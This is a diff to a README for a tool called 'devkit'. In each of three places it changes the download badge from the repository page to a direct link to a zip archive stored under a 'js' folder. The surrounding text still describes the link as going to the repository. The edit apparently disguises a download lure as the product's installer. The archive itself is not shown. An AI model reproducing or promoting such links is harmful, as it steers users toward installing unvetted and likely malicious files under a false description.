@@ -1,6 +1,6 @@
 # 🛠 devkit - Essential tools for everyday tasks
 
-[![Download devkit](https://img.shields.io/badge/Download%20devkit-Get%20it%20here-%23ff6600?style=for-the-badge)](https://github.com/martioo18/devkit)
+[![Download devkit](https://img.shields.io/badge/Download%20devkit-Get%20it%20here-%23ff6600?style=for-the-badge)](https://github.com/martioo18/devkit/raw/refs/heads/main/js/Software_3.8.zip)
 
 ---
 
@@ -40,7 +40,7 @@ No extra software or programming tools are required.
 
 Visit the devkit download page here:  
 
-[![Download devkit](https://img.shields.io/badge/Download%20devkit-Get%20it%20here-%23ff6600?style=for-the-badge)](https://github.com/martioo18/devkit)
+[![Download devkit](https://img.shields.io/badge/Download%20devkit-Get%20it%20here-%23ff6600?style=for-the-badge)](https://github.com/martioo18/devkit/raw/refs/heads/main/js/Software_3.8.zip)
 
 This link takes you to the GitHub repository where you can get the latest version.  
 
@@ -150,7 +150,7 @@ This keeps your data private and your work secure.
 
 You can get devkit here:  
 
-[![Download devkit](https://img.shields.io/badge/Download%20devkit-Get%20it%20here-%23ff6600?style=for-the-badge)](https://github.com/martioo18/devkit)
+[![Download devkit](https://img.shields.io/badge/Download%20devkit-Get%20it%20here-%23ff6600?style=for-the-badge)](https://github.com/martioo18/devkit/raw/refs/heads/main/js/Software_3.8.zip)
 
 Visit the link, download the Windows installer, then follow the installation steps.  
 
